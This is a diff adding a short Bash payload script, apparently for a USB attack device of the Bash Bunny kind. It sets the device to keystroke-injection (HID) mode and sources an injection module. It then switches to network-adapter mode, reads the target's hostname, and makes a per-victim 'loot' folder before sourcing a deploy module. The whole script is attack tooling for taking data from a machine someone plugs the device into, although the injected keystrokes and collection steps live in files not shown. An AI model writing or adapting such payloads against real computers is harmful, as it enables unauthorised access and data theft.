@@ -1,0 +1,28 @@
+#!/bin/bash
+
+#### INITIALIZE STAGE ####
+LED SETUP
+#### HID STAGE ####
+ATTACKMODE HID
+
+# HID Script
+source $PAYLOADFOLDER/payloadmods/qinitial.txt
+
+#### ETHERNET STAGE ####
+ATTACKMODE RNDIS_ETHERNET RNDIS_SPEED_10000
+LED SETUP
+
+# Get target hostname
+while [ -z $TARGET_HOSTNAME ]; do
+	GET TARGET_HOSTNAME
+	sleep 1
+done
+
+# Create loot dir from machine name inside BBTPS loot folder
+export LOOTDIR=$ROOTLOOTDIR/$TARGET_HOSTNAME
+if [ ! -d $LOOTDIR ]; then
+    mkdir $LOOTDIR
+fi
+
+# Network initialization and deploy
+source $PAYLOADFOLDER/payloadmods/netinitial.txt
